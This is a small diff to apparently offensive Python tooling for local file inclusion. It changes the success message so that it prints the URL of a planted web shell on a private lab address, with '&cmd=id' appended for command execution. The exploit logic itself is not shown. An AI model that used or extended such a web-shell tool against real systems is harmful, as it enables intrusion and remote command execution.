@@ -266,7 +266,8 @@ def main():
         print("[*] Attempting exploitation...")
         # Attempt to exploit
         if lfi.exploit():
-            info(f"Exploitation successful! Shell created at {lfi.shell_path}")
+            # lfi.target = http://192.168.215.3/index.php?page={}, so we remove the {} and replace it with the actual path
+            info(f"Exploitation successful! Shell created at {lfi.target.replace('{}', '')+lfi.shell_path}&cmd=id")
             
             # Execute the custom command if provided
             if args.custom_cmd:
